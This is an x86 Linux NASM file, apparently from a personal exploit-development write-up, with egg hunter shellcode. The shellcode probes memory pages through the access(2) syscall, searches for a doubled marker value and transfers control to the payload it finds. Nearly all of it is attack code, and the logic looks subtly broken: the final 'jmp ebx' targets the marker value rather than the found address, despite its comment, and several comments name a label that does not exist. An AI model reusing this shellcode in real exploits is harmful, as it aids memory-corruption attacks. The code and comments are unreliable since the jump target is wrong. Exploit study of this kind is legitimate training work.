; Filename: egghunter.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Egg Hunter shellcode using the access(2) syscall


global _start			

section .text
_start:

init:
	; Clearing all the registers that will be used and moving the egghunter key to ebx. 
	; Note this value is 1 larger than the required key and then decremented afterwards.
	; This is to stop the egghunter thinking thinking that this may be the key to find.
	
	xor ecx, ecx 		; value to be empty for syscall
	mul ecx      		; eax nulled
	mov ebx, 0x50905091     ; key to find + 1
	dec ebx      		; dec edx to = the key


addr_page:
	or dx, 0xfff 		; edx is used as a pointer used to iterate through blocks of memory
				; See write up for a breakdown

incr:
	inc edx			; increment edx to push it from 0xfff to 0x1000 - it will add 0x1000 each call
	pusha        		; Push all general purpose registers to the stackto maintain state after syscall


mov al, 0x21 			; access(2) syscall value
int 0x80     			; Interupt for syscall


cmp al, 0xf2 			; Compare return value with 0xf2 - lowest byte of efault value 
popa         			; pop registers back from before syscall
jz short addr_page 		; If the zero flag is set, jump to addr_inc


cmp [edx], ebx 			; Compare the contents of ebx with edx, the key
jnz short incr	 		; If the values do not match a jump is taken to addr_inc


cmp [edx+0x4], ebx 		; Compare the contents of ebx+0x4 to edx, the key
jnz short incr	 		; If the values do not match a jump is taken to addr_inc


jmp ebx      			; unconditional jump to edx, the confirmed location to continue execution
